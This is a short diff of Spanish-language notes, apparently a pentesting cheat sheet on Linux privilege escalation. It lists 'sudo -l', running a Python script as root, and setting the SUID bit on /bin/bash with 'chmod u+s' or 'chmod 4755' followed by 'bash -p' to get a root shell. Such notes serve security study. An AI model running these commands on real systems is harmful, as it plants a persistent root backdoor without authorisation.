@@ -1,13 +1,15 @@
-.
 
-::: sudo -l					"lista los programas que podemos ejecutar como superUsuario... <3 <3 <3"
- :: sudo -u root python3.8 /path/progra/here.py					"...<3 <3 <3"
+***
+	::: sudo -l					"lista los programas que podemos ejecutar como superUsuario... <3 <3 <3"
+	 :: sudo -u root python3.8 /path/progra/here.py					"...<3 <3 <3"
 
-  ::: sudo -u user_test whoami
+		::: sudo -u user_test whoami
 
-						output::>  user_test
+							output::>  user_test
 
-::: chmod u+s /bin/bash   &&   bash -p     "ejecuta bash como el usuario propietario, en este caso root"
+*** permisos suid a bash 
+	::: chmod 4755 /bin/bash			"SUID"
+	::: chmod u+s /bin/bash   &&   bash -p     "ejecuta bash como el usuario propietario, en este caso root"
 
 
 
